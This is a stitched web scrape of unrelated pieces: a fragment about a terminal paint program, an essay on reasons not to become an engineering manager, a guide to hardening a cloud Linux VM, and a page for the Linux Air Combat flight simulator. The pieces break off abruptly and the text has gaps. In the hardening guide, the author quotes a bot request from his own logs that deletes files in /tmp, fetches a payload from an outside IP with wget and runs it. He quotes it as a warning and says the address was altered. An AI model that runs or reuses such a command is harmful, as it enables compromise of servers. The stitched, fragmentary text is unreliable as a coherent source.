srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png" width="1008" height="834" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:834,&quot;width&quot;:1008,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:28943,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><a href="https://github.com/1j01/textual-paint" rel="">It's a version of paint</a><span>&nbsp;that runs in the terminal, thanks to the Python lib&nbsp;</span><a href="https://textual.textualize.io/" rel="">textual</a></p><p>It's not going to change your life or anything, but WOW.</p><p>I installed it, and it's damn reactive.

<div id="readability-page-1" class="page"><div>
		<p>Yesterday we had a super fun meetup here at Intercom in Dublin.&nbsp; We split up into small discussion groups and talked about things related to managing teams and being a senior individual contributor (IC), and going back and forth throughout your career.</p>
<p>One interesting question that came up repeatedly was: âwhat are some reasons that someone might&nbsp;<em>not</em> want to be a manager?â</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">"Things would be different if I was in charge", the all belief that authority is an all powerful magic wand you can wave and fix things.</p>â Mark Roddy (@digitallogic) <a href="https://twitter.com/digitallogic/status/1169625740796579842?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<p>Fascinatingly, I heard it asked over the full range of tones from extremely positive (âwhat kind of nutter&nbsp;<em>wouldnât&nbsp;</em>want to manage a team?!â) to extremely negative (âwho would <em>ever</em> want to manage a team?!â).&nbsp; So I said I would write a piece and list some reasons.</p>
<p>Point of order: <strong>I am going to focus on intrinsic reasons</strong>, not external ones.&nbsp; There are lots of toxic orgs where you wouldnât want to be a manager for many reasons â but that list is too long and overwhelming, and I would argue you probably donât want to work there in ANY capacity.&nbsp; Please assume the surroundings of a functional, healthy org (I know, I know â whopping assumption).</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">it's a huge responsibility. if you are having trouble advocating for yourself and your own needs/career goals/work output, then you may not have the capacity to do it for the people you're responsible for managing. i take the role extremely seriously, and it takes a toll.</p>â pie bob (@djpiebob) <a href="https://twitter.com/djpiebob/status/1169675819716763649?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<h3>1. You love what you do.</h3>
<p>Never underestimate this one, and <em>never</em> take it for granted.&nbsp; If you look forward to work and even miss it on vacation; if you occasionally leave work whistling with delight and/or triumph; if your brain has figured out how to wring out regular doses of dopamine and serotonin while delivering ever-increasing value; if you look back with pride at what you have learned and built and achieved, if you regularly tap into your creative happy place â¦ hell, your life is already better than 99.99% of all the humans who have ever labored and lived.&nbsp; Donât underestimate the magnitude of your achievement, and donât assume it will always be there waiting for you to just pick it right back up again.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">I got into tech because I like writing code. As a manager, I didnât get to do that. Becoming a not-manager lets me do that again.</p>â Ben Cox (@BenCoxMusic) <a href="https://twitter.com/BenCoxMusic/status/1169780841532276736?ref_src=twsrc%5Etfw">September 6, 2019</a></blockquote>
<h3>2. It is easy to get a new engineering job.&nbsp; Really, really easy.</h3>
<p>Getting your first gig as an engineer can be a challenge, but after that?&nbsp; It is possibly easier for an experienced engineer to find a new job than anyone else on the planet. There is so much demand this skill set that we actually complain about how annoying it is being constantly recruited!&nbsp; Amazing.</p>
<p>It is typically harder to find a new job as a manager.&nbsp; If you think interview processes for engineers are terrible (and they are, honey), they are even weirder and less predictable (and more prone to implicit bias) for managers.&nbsp; So much of manager hiring is about intangibles like âculture fitâ and âdo I like youâ â things you canât practice or study or know if youâve answered correctly.&nbsp; And soooo much of your skill set is inevitably bound up in navigating the personalities and bureaucracies of particular teams and a particular company.&nbsp; A managerâs effectiveness is grounded in trust and relationships, which makes it much less transferrable than engineering skills.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">Someone has probably said it, but management will always be an option, but going back from management to writing code again can be very difficult (after some period of time). Anyway, looking forward to the post.</p>â Zack Korman (@ZackKorman) <a href="https://twitter.com/ZackKorman/status/1169839214113898501?ref_src=twsrc%5Etfw">September 6, 2019</a></blockquote>
<h3>3. There are fewer management jobs.</h3>
<p>I am not claiming it is equally trivial for <em>everyone</em> to get a new job; it can be hard if you live in an out-of-the-way place, or have an unusual skill, etc.&nbsp; But in almost every case, it becomes harder if youâre a manager.&nbsp; Besides â given that the ratio of engineers to line managers is roughly 7 to one â there will be almost an order of magnitude fewer eng manager jobs than engineering jobs.</p>

<h3>4. Manager jobs are the first to get cut.</h3>
<p>Engineers (in theory) add value directly to the bottom line.&nbsp; Management is, to be brutally frank, overhead.&nbsp; Middle management is often the first to be cut during layoffs</p>
<p>Remember how I said that creation is the engineering superpower?&nbsp; Thatâs a nicer way of saying that managers donât directly create any value.&nbsp; They may indirectly contribute to increased value over time â the good ones do â but only by working through other people as a force multiplier, mentor etc.&nbsp; When times get tough, you donât cut the people who build the product, you cut the ones whose value-added is contingent or harder to measure.</p>
<p>Another way this plays out is when companies are getting acquired.&nbsp; As a baseline for acquihires, the acquiring company will estimate a value of $1 million per engineer, then&nbsp;<em>deduct</em>&nbsp;$500k for every other role being acquired.&nbsp; Ouch.</p>

<h3>5. Managers canât really job hop.</h3>
<p>Where itâs completely normal for an engineer to hop jobs every 1-3 years, a manager who does this will not get points for learning a wide range of skills, theyâll be seen as âprobably difficult to work withâ.&nbsp; I have no data to support this, but I suspect the job tenure of a successful manager is at least 2-3x as long as that of a successful IC.&nbsp; It takes a year or two just to gain the trust of everyone on your team and the adjacent teams, and to learn the personalities involved in navigating the organization.&nbsp; At a large company, it may take a few times that long.&nbsp; I was a manager at Facebook for 2.5 years and I still learned some critical new detail about managing teams there on a weekly basis.&nbsp; Your value to the org really kicks in after a few years have gone by, once a significant part of the way things get done resides in your cranium.</p>

<h3>6) Engineers can be little shits.</h3>
<p>You know the type.&nbsp; Sneering about how managers donât do any âreal workâ, looking down on them for being âless technicalâ.&nbsp; Basically everyone who utters the question â.. but how <em>technical </em>are they?â in that particular tone of voice is a shitbird.&nbsp; Hilariously, we had a great conversation about whether a great manager needs to be technical or not â many people sheepishly admitted that the best managers they had ever had knew absolutely nothing about technology, and yet they gave managers coding interviews and expected them to be technical.&nbsp; Why?&nbsp; Mostly because the engineers wouldnât respect them otherwise.</p>

<p>Do you shy away from confrontation?&nbsp; Does it seriously stress you out to give people feedback they donât want to hear?&nbsp; Manager life may not be for you.&nbsp; There hopefully wonât be too many of these moments, but when they do happen, they are likely to be of outsized importance.&nbsp; Having a manager who avoids giving critical feedback can be&nbsp; really damaging, because it deprives you of the information you need to make course corrections before the problem becomes <em>really</em> big and hard.</p>

<h3>8)&nbsp; A managerâs toolset is smaller than you think.</h3>
<p>As an engineer, if you really feel strongly about something, you just go off and do it yourself.&nbsp; As a manager, you have to lead through influence and persuasion and inspiring other people to do things.&nbsp; It can be quite frustrating.&nbsp; âBut canât I just tell people what to do?â you might be thinking.&nbsp; And the answer is no.&nbsp; Any time you have to tell someone what to do using your formal authority, you have failed in some way and your actual influence and power will decrease.&nbsp; Formal authority is a blunt, fragile instrument.</p>

<h3>10)&nbsp; Use your position as an IC to bring balance to the Force.</h3>
<p>I LOVE working in orgs where ICs have power and use their voices.&nbsp; I love having senior ICs around who model that, who walk around confidently assuming that their voice is wanted and needed in the decision-making process.&nbsp; If your org is not like that, do you know who is best positioned to shift the balance of power back?&nbsp; Senior ICs, with some behind-the-scenes support from managers.&nbsp; For this reason, I am always a little sad when a vocal, powerful IC who models this behavior transitions to management.&nbsp; If ALL of the ICs who act this way become managers, it sends a very dismaying message to the ranks â that you only speak up if youâre in the process of converting to management.</p>

<h3>11)&nbsp; Management is just a collection of skills, and you should be able to do all the fun ones as an IC.</h3>
<p>Do you love mentoring?&nbsp; Interviewing, constructing hiring loops, defining the career ladder?&nbsp; Do you love technical leadership and teaching other people, or running meetings and running projects?&nbsp; Any reasonably healthy org should encourage all senior ICs to participate and have leadership roles in these areas.&nbsp; Management can be unbundled into a lot of different skills and roles, and the only ones that are necessarily confined to management are the shitty ones, like performance reviews and firing people.&nbsp; I LOVE it when an engineer expresses the desire to start learning more management skills, and will happily brainstorm with them on next steps â get an intern? run team meetings?&nbsp; there are so many things to choose from!&nbsp; When I say that all engineers should try management at some point in their career, what I really mean is these are skills that every senior engineer should develop.&nbsp; Or as Jill says:</p>

<h3>12) Joy is much harder to come by.</h3>
<p>That dopamine drip in your brain from fixing problems and learning things goes away, and itâs â¦ real tough.&nbsp; This is why I say you need to <a href="https://charity.wtf/2019/01/04/engineering-management-the-pendulum-or-the-ladder/">commit to a two year stint</a> if youâre going to try management: that, plus it takes that long to start to get your feet under you and is hard on your team if theyâre switching managers all the time.&nbsp; It usually takes a year or two to rewire your brain to look for the longer timeline, less intense rewards you get from coaching other people to do great things.&nbsp; For some of us, it never does kick in.&nbsp; Itâs genuinely hard to know whether youâve done anything worth doing.</p>

<h3>13) It will take up emotional space at the expense of your personal life.</h3>

<h3>16) If technical leadership is what your heart loves most, you should NOT be a manager.</h3>
<p>If you are a strong tech lead and you convert to management, it is your job to begin slowly taking yourself out of the loop as tech lead and promoting others in your place.&nbsp; Your technical skills will stop growing at the point that you switch careers, and will slowly decay after that.&nbsp; Moreover, if you stay on as tech lead/manager you will slowly suck all the oxygen from the room.&nbsp; It is your job to train up and hand over to your replacements and gradually step out of the way, period.</p>

<h3>In conclusion</h3>
<p>Given all this, why should ANYONE ever be a manager?&nbsp; Shrug.&nbsp; I donât think thereâs any one good or bad answer.&nbsp; I used to think a bad answer would be âto gain power and influenceâ or âto route around shitty communication systemsâ, but in retrospect those were my reasons and I think things turned out fine.&nbsp; Itâs a complex calculation.&nbsp; If you want to try it and the opportunity arises, try it!&nbsp; Just commit to the full two year experiment, and pour yourself into learning it like youâre learning a new career â since, you know, you <em>are</em>.</p>

<p>But please do be honest with yourself.&nbsp; One thing I hate is when someone wants to be a manager, and I ask why, and they rattle off a list of reasons theyâve heard that people SHOULD want to become managers (âto have a greater impact than I can with just myself, because I love helping other people learn and grow, etcâ) but I am damn sure they are lying to themselves and/or me.</p>
<p>Introspection and self-knowledge are absolutely key to being a decent manager, and lord knows we need more of those.&nbsp; So donât kick off your grand experiment by lying to yourself, ok?</p>

<p>Iâm not a sysadmin, and I donât want to be. But I write software for the web, which means Iâm never far from a server, and sometimes Iâm the only one around. So even if I didnât want the job, I have it, and I need to take the security of these hosts seriously. If youâre in a similar situation, this guide is for you. Iâll walk you through the steps I use to harden a new virtual machine from a cloud provider.</p>
<p>Ideally, you would automate everything here. But this is a manual guide, where I assume youâll be typing the commands. I know people still manually configure servers, and if youâre going to do it, at least do it securely. But I hope after youâve gone through this once or twice, youâll automate it. Iâll have more to say about automation at the end.</p>
<p>Iâm making a few assumptions to keep this post brief:</p>
<ul>
<li>Your host is a VM from a cloud provider (AWS, GCP, Linode, etc.) with a standard machine image.</li>
<li>Your server has Debian 11 (Bullseye) or Ubuntu. The same basic procedure should work with any Linux distribution, but the details will vary.</li>
<li>You know your way around the Linux shell (if you can navigate directories and edit files, youâll be fine).</li>
</ul>
<h2 id="know-your-enemy">Know your enemy</h2>
<p>Before we get into it, we need to know what weâre up against, and first up are bots. As an experiment, I started a VM in AWS and enabled SSH passwords, and started an HTTP server. After only an hour, I had one failed SSH login and a dozen requests for things like:</p>
<pre tabindex="0"><code>GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.231/jaws;sh+/tmp/jaws
</code></pre><p>I donât know what <code>jaws</code> does, but it doesnât sound friendly. (Hopefully, itâs obvious, but donât run thatâif you really must, I reversed the last octet of the IP address.)</p>
<p>These bots scan the Internet looking for any vulnerable systems. The good news is that theyâre not out to get you so much as theyâre out to get anyone. These attacks are usually easy to stop, keep your host updated, and be a little bit tougher than the next host on their list.</p>
<p>But sometimes, there is someone out to get you personally, and sadly no system is truly safe. The best we can do is block whatâs known, put up defenses at every layer, and hope weâve become more trouble than weâre worth. On that cheery note, letâs dive in.</p>
<h2 id="update-the-software">Update the software</h2>
<p>Even if you just launched it, your system is probably already outdated. There might even be a critical security vulnerability that didnât make it into the VM image. So to start:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo apt update
</span></span><span><span>sudo apt upgrade
</span></span></code></pre></div><h2 id="create-a-user-account">Create a user account</h2>
<p>You should not log in directly as <code>root</code>. Use another account and <code>sudo</code> when you need superuser access. Your cloud VM likely has another account already, which you can use, if you wish. But I prefer to make a new account because the default one tends to be obvious.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>sudo useradd -m -s /bin/bash <span>\
</span></span></span><span><span><span></span>  -G users,sudo <span>\
</span></span></span><span><span><span></span>  alfred
</span></span></code></pre></div><p>Name your account whatever you like, but avoid anything easily guessable, like <code>admin</code>.</p>
<p>The <code>-G</code> line lists groups that the user belongs to. The <code>sudo</code> group will grant access to run commands as <code>root</code> (assuming <code>sudo</code> is configured this way, which it usually is).</p>
<p>Youâll need a password for this account. You wonât log in with this password, but you will need it for <code>sudo</code>, so pick a good one. Ideally, generate a random one in your password manager. To set the password:</p>
<p>If your VM image disables password logins with SSH, copy the key from the default account to your new account:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>cp -r ~<span>{</span>admin,alfred<span>}</span>/.ssh
</span></span><span><span>chown -R alfred:alfred ~alfred/.ssh/
</span></span></code></pre></div><p>Log out and back in as your new user and verify that sudo works:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>sudo bash -c <span>'echo "I am $USER!"'</span>
</span></span></code></pre></div><p>It should ask for your password. If it works without a password, then run <code>sudo visudo</code> and replace the line that begins with <code>%sudo</code> with:</p>
<pre tabindex="0"><code>%sudo   ALL=(ALL:ALL) ALL
</code></pre><p>Make sure <code>sudo</code> works before moving on because you can lock yourself out of <code>root</code> if youâre not careful.</p>
<p>We donât want to leave old unused accounts around. So if thereâs a default account from your VM image, delete it:</p>
<h2 id="disable-root-logins">Disable root logins</h2>
<p>Now that we have an account with <code>sudo</code> privileges, thereâs no reason anyone should log in with <code>root</code>. First, disable root at the console:</p>
<p>Now prevent <code>root</code> from logging in over SSH. Add (or uncomment) this line in <code>/etc/ssh/sshd_config</code>:</p>
<pre tabindex="0"><code>PermitRootLogin no
</code></pre><p>You will have to restart <code>sshd</code> for the change to take effect, but weâll have a few more SSH config changes. If youâre anxious to do it now, run:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>sudo systemctl restart ssh
</span></span></code></pre></div><h2 id="umask"><code>umask</code></h2>
<p>We need to change the default <code>umask</code>, which controls the permissions on new files and directories. Most Linux distributions default <code>umask</code> to <code>022</code>, which gives read access to every user. Run <code>umask</code> to see your current setting.</p>
<p>We want a <code>umask</code> of <code>077</code>, which removes access to every user except the one who created the file. <code>027</code> would work, too (full access for the owner, read for group, and nothing for other). The point is that itâs safer to loosen file permissions when needed rather than tighten them.</p>
<p>For <code>sh</code> and <code>bash</code>, we can add <code>umask</code> to <code>/etc/profile</code>:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo bash -c <span>'echo -e "\numask 077" &gt;&gt; /etc/profile'</span>
</span></span></code></pre></div><p>If you use another shell, I will assume you know where to configure it.</p>
<p>Log out and back in, then verify new files have the desired permissions:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>$ touch xyz ; ls -l xyz ; rm xyz
</span></span><span><span>-rw------- <span>1</span> alfred alfred <span>0</span> Mar <span>25</span> 11:23 xyz
</span></span></code></pre></div><h2 id="ssh-keys">SSH keys</h2>
<p>I know you, and I always use new, randomly generated passwords for every account, but most people donât. Someday you may grant access to someone with bad password hygiene, so itâs best to start right and only allow logins by SSH key. Your cloud provider probably already configured an SSH key for you, but donât skip this section because the default settings still need to be tweaked.</p>
<p>If you have an SSH key already that you want to use, then great. If not, and youâre on Linux or Mac, generate one:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>ssh-keygen -t rsa -b <span>4096</span>
</span></span></code></pre></div><p>If youâre on Windows, <a href="https://www.puttygen.com/">PuTTYgen</a> should work (but donât ask me about it because Iâve never used it).</p>
<p>Back on the server now. By default, SSH reads authorized keys from <code>$HOME/.ssh/authorized_keys</code>. The problem is that if an attacker finds an exploit that lets them write one file, you can be sure theyâll attempt to add a public key to <code>$HOME/.ssh/authorized_keys</code>. Itâs safer if only <code>root</code> can add an SSH key.</p>
<p>We need a central place to keep public keys:</p>
<pre tabindex="0"><code>sudo mkdir -p /etc/ssh/authorized_keys
sudo chmod 0711 /etc/ssh/authorized_keys
</code></pre><p>The permissions on the directory give <code>root</code> full access. Everyone else can read files but not create them or even get a directory listing.</p>
<p>Weâll create one file in this directory for each user with SSH access. If you already have an <code>authorized_keys</code> file, you can copy it into place:</p>
<pre tabindex="0"><code>sudo cp ~alfred/.ssh/authorized_keys /etc/ssh/authorized_keys/alfred
</code></pre><p>If not, paste the public key:</p>
<pre tabindex="0"><code>sudo bash -c 'echo your public ssh key &gt; /etc/ssh/authorized_keys/alfred'
</code></pre><p>The last step is to make the file readable by the user:</p>
<pre tabindex="0"><code>sudo setfacl -m u:alfred:r /etc/ssh/authorized_keys/alfred
</code></pre><p>If <code>setfacl</code> doesnât exist, install it with <code>sudo apt install acl</code>.</p>
<p>Before continuing, make sure that your user can read their <code>authorized_keys</code> file:</p>
<pre tabindex="0"><code>cat /etc/ssh/authorized/keys/$USER
</code></pre><p>If you canât read it now, SSH wonât be able to read it from your account either, and youâll be locked out.</p>
<p>Now configure SSH to read public keys from our central directory by adding this to <code>/etc/ssh/sshd_config</code>:</p>
<pre tabindex="0"><code>AuthorizedKeysFile /etc/ssh/authorized_keys/%u
</code></pre><p>While weâre editing <code>sshd_config</code>, we also want to disable password logins (this may already be set):</p>
<pre tabindex="0"><code>PasswordAuthentication no
</code></pre><p>Restart <code>sshd</code> for those changes to take effect:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo systemctl restart ssh
</span></span></code></pre></div><p>Donât log out yet. But do log in from another terminal window to make sure it works.</p>
<p>If you have an old <code>authorized_keys</code> file, delete it: <code>rm ~/.ssh/authorized_keys</code> (it isnât insecure, itâs just confusing to leave an unused file in place).</p>
<h2 id="wireguard">WireGuard</h2>
<p>Weâve done the basics to lock down SSH. But, ideally, SSH would not be accessible from the Internet. You could use firewall rules to restrict access to specific IP addresses. But in my case, I have a dynamic IP, and I donât want to run a bastion host, so that wonât work for me. Fortunately, <a href="https://www.wireguard.com/">WireGuard</a> makes running a VPN easy.</p>
<p>If you havenât heard of it, WireGuard is a peer-to-peer VPN. There isnât a central server. On each host, you set the public keys of its authorized peers. Itâs a little bit work to configure, but it works well.</p>
<p>One drawback to WireGuard is that the connection goes both ways. If your server is compromised, the attacker can reach any configured peer. Personally, I have the other side of the WireGuard tunnel in a local VM that blocks inbound connections from the tunnel.</p>
<p>However you do it, I will assume you have some other host already configured with WireGuard. Before we get started, youâll need:</p>
<ul>
<li>The public key and private IP of the peer you want to connect from.</li>
<li>The private IP to assign to the server. It should be in the same subnet as the peer.</li>
</ul>
<p>Start by installing WireGuard. Itâs simple in Debian Bullseye and recent Ubuntu versions:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo apt install wireguard 
</span></span></code></pre></div><p>Now generate a key pair:</p>
<pre tabindex="0"><code>sudo mkdir -p /etc/wireguard
sudo sh -c 'wg genkey | tee /etc/wireguard/private_key | wg pubkey &gt; /etc/wireguard/public_key'
</code></pre><p>And create a config file in <code>/etc/wireguard/wg0.conf</code>:</p>
<pre tabindex="0"><code>[Interface]
Address = 192.168.50.2/24
PrivateKey = &lt;THE PRIVATE KEY&gt;
ListenPort = 12345

[Peer]
PublicKey = u8Uo3ab+psKeOpciUIaNuBulNrOCXrU8GN3yD06/0WM=
AllowedIPs = 192.168.50.1/32
</code></pre><p>Youâll need to set the address to an IP on the same subnet as the computer youâre accessing it from. Also, configure the correct <code>AllowedIPs</code> and <code>PublicKey</code>. You can copy/paste the <code>PrivateKey</code>, or use <code>:r /etc/wireguard/private_key</code> in VIM.</p>
<p>Set <code>ListenPort</code> to any random ephemeral port number. You can generate one in Bash:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>echo <span>$((</span>$SRANDOM <span>%</span> <span>55535</span> <span>+</span> <span>10000</span><span>))</span>
</span></span></code></pre></div><p>The port number isnât a secret per se, but WireGuard hides itself well, so we might as well prevent an attacker from knowing it.</p>
<p>If your cloud provider has a firewall, donât forget to open WireGuardâs UDP port.</p>
<p>Now start WireGuard:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo systemctl start wg-quick@wg0
</span></span><span><span>sudo systemctl enable wg-quick@wg0
</span></span></code></pre></div><p>Donât forget to configure the server as a peer on the computer youâre connecting from. Make sure you can connect to SSH through the WireGuard IP.</p>
<h2 id="firewall">Firewall</h2>
<p>Your cloud provider probably has a firewall already. If youâre happy with that, allow WireGuard, block SSH, and call it a day. But if you donât donât like that firewall, you can install one on the server.</p>
<p>On Debian based systems, I use <code>ufw</code>. Install it with:</p>
<p>The first rule we need allows anyone to access the WireGuard port. Change <code>$WG_PORT</code> to whatever you configured in <code>/etc/wireguard/wg0.conf</code>:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo ufw allow in on eth0 to any port $WG_PORT proto udp
</span></span></code></pre></div><p>Also run <code>ip a</code> and make sure the interface you want to filter is actually <code>eth0</code>, sometimes it may not be.</p>
<p>Now we want to allow SSH on WireGuard:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo ufw allow in on wg0 to any port <span>22</span> proto tcp
</span></span></code></pre></div><p>And add any other ports you want open:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo ufw allow in on eth0 to any port <span>80</span> proto tcp
</span></span><span><span>sudo ufw allow in on eth0 to any port <span>443</span> proto tcp
</span></span></code></pre></div><p>When your rules are in place, cross your fingers and turn on <code>ufw</code>:</p>
<p>With any luck, SSH remains connected. Donât log out until you confirm you can get a new SSH connection.</p>
<h2 id="next-steps">Next steps</h2>
<p>There are a few more things you should consider:</p>
<ul>
<li>Find a process to keep your system up to date. Debianâs <a href="https://wiki.debian.org/AutomatedUpgrade">Automatic Update</a> is one option, though you may want some oversight.</li>
<li>Most attacks wonât be against what weâve covered in this guide, but against the applications you install next. Properly done, containers can limit the impact.</li>
</ul>
<p>Finally, you should automate the job of initializing your host. With practice, this process can be done manually in about 30 minutes, but your automation will be a couple of minutes at most. Manually typing the commands is also error-prone, and a few steps can lock you out if you arenât careful.</p>
<p>If you arenât sure where to start with automation, I suggest you start simple. For example, write an init script that gets your host to a known state before Ansible (or a similar tool) takes over.</p>
<p>If you want to use an init script, I have published some <a href="https://github.com/pboyd/initscripts">scripts</a> which do everything in this blog post, which you can use directly or as a base for what you really need.</p>

<p><big><b><big><big>LINUX AIR COMBAT</big></big></b><br>
</big></p>

<p>This is a free, open-source combat flight simulator developed by
AskMisterWizard.com for the LINUX community. Its roots came from the
well-known "classic" flight game known as "GL-117", but this new
incarnation has been extensively re-written and improved, and the focus
has changed from arcade gaming to World War II combat flight simulation.<br>
<big><small><small><small><big><big><big><big>
</big></big></big></big></small></small></small></big></p>

<p><big><small>Current Released versions: 9.15.&nbsp; Each version is
also available as an "</small></big><big><small>AppImage" containing a
single, universal, compiled
binary file ready for immediate use with no need to compile or
install&nbsp; (Learn more about AppImages from our forum <a href="https://sourceforge.net/p/linuxaircombat/discussion/lacandappimages/" target="_top">HERE</a>).
It runs nicely on almost any kind of computer that can run any popular
version of desktop Linux, ranging from Raspberry Pi through "Steam
Deck" and on up to super gaming-class machines.</small></big><big><small><br>

is now MATURE and ready for widespread LINUX distribution!</big></big></big></span><span></span><span><p>

People have been asking to have
this included in mainstream LINUX distributions and repositories. We're
flattered to have that attention, and for almost 6 years we were
asking for your patience as we got it ready for "prime time". We are
very pleased to confirm that official development of stable,
"production-quality" Linux Air Combat is completely
FINISHED. We're DONE adding features, and the little bugs and tweaks of
recent releases have been so tiny as to confirm LAC's mature
status. All versions since November 15, 2019 remain mutually
interoperable, and recent versions have proven to be very stable on a
wide variety of LINUX distros.</p><p>

<a href="https://sourceforge.net/p/linuxaircombat/discussion/lacinrepositories/thread/a2a9ed15f5/" target="_top">CLICK HERE</a> for a discussion in our forums about LAC
in LINUX Repositories that ends with a list of Repositories already
supporting it.</p></span><span>Accordingly it is now
appropriate for
LINUX users to ask their own distribution managers and packagers to
include it. Then, if those people need help, refer them to the
discussion <a href="https://sourceforge.net/p/linuxaircombat/discussion/lacinrepositories/" target="_top">HERE</a>. They can also contact us
by email (webmaster@AskMisterWizard.com) and we will be
glad to assist. In the meantime, the best way to get LAC is to download
it from the prominent link advertised at the top of this web page, or
from <a href="https://sourceforge.net/projects/linuxaircombat/?source=navbar" target="_top">SourceForge.net</a></span><span>.</span><span></span><span><br>

<br>

<span>NEW SINCE AUG2022: Most new users will
no longer
find it necessary to compile LAC from source code. As of this writing
we have published compiled binary version 9.15 in
the well-known, universally compatible "AppImage" format and we have
seen widespread success and proven,
full
binary compatibility with the vast majority of Linux Distros for "x-86"
hardware. With this new "AppImage" option, obtaining and testing Linux
Air Combat is a simple matter of downloading one file, marking it as
executable, and running it. No compiling and no installation! Learn
more in our forums <a href="https://sourceforge.net/p/linuxaircombat/discussion/lacandappimages/" target="_top">HERE</a>.<br>

<span>Flight controls for LINUX AIR
COMBAT. The default configuration is set up for a numeric keypad,
standard keyboard, and the popular, inexpensive Logitech Extreme 3dPro
joystick as illustrated above. It is possible to reconfigure for a
different joystick, a USB console-style game controller, or to use a
generic "mouse pointer" instead. Keyboard keys are also reconfigurable
and/or
interchangeable with joystick buttons. In general
it is possible to assign almost any joystick button, controller button,
axis, or keyboard key to any arbitrary
flight or view function. It is also easy to
reconfigure a typical joystick "hat switch" to configure view
directions, etc. Further instruction is available in video tutorials

<b><big><big><small><small><big><big>Free, multiplayer online access is
now available, based on
new Linux Air Combat official Release V9.15.</big></big><br>
</small></small>
</big></big></b>
<p><big>In December of 2015,
AskMisterWizard.com announced availability of our new, free, open
source flight simulator for
LINUX,&nbsp; now known as "LINUX AIR COMBAT".</big><br>
</p>

<p>The first published version was alpha test number 1.99. Since then,
we've
continued to add features, fix bugs, and enhance the flight
models.&nbsp; As of this writing, the
current production version is 9.15 (for global installation in the /usr
filesystem for all users), supporting 54 aircraft (download link
below).&nbsp; Version 9.15 is also available in precompiled,
binary-only
format, configured for (almost) universal compatibility by virtue of
the well-known "AppImage" tools and format.<br>
</p>

<p><a target="_top" href="https://askmisterwizard.com/2019/LinuxAirCombat/LinuxAirCombatChangeLog.htm">Click
HERE</a><span>
to see the Linux Air Combat ChangeLog, with text and video summaries
documenting all of the changes that have been implemented in each
published version.</span><br>
</p>

<p>Most of our development work has been done on 64-bit
versions of the well-known "PcLinuxOs", "Ubuntu", and "Manjaro" Linux
distributions. Testing has
